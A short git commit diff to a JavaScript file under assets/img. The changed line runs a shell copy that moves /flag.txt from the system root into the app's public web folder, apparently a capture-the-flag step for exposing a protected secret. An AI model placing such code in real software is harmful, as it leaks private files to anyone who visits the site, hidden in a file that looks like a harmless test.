64f57be67a5cac641a500382232d8f472b1da09c
John <146613722+cattl3ya@users.noreply.github.com>
2026-02-21 15:01:50 -0600

    Update test.js

--- assets/img/test.js
+++ assets/img/test.js
@@ -1,7 +1,8 @@
 import { exec } from 'node:child_process';
 
 // This runs the literal system 'cp' command
-exec('cp ./flag.txt ./snapshots/flag.txt', (err) => {
+exec('cp /flag.txt /app/public/flag.txt', (err) => {
   if (err) console.error('System copy failed', err);
   else console.log('Done');
 });
+
